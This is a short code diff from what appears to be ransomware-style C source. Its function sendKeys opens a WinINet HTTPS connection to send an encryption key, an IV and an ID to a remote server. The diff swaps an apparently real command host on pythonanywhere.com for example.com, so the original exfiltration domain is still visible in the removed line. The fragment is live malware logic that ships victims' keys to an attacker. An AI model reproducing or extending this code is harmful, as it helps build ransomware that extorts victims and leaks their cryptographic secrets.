@@ -272,7 +272,7 @@ void xorEncrypt(unsigned char* x7, size_t x8) {
 void sendKeys(const unsigned char* key, const unsigned char* iv, const char* id) {
     HINTERNET hSession = InternetOpen("TLD13Browser/12.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
-    HINTERNET hConnect = InternetConnect(hSession, "tdsoperational.pythonanywhere.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hConnect = InternetConnect(hSession, "example.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         InternetCloseHandle(hSession);
         return;
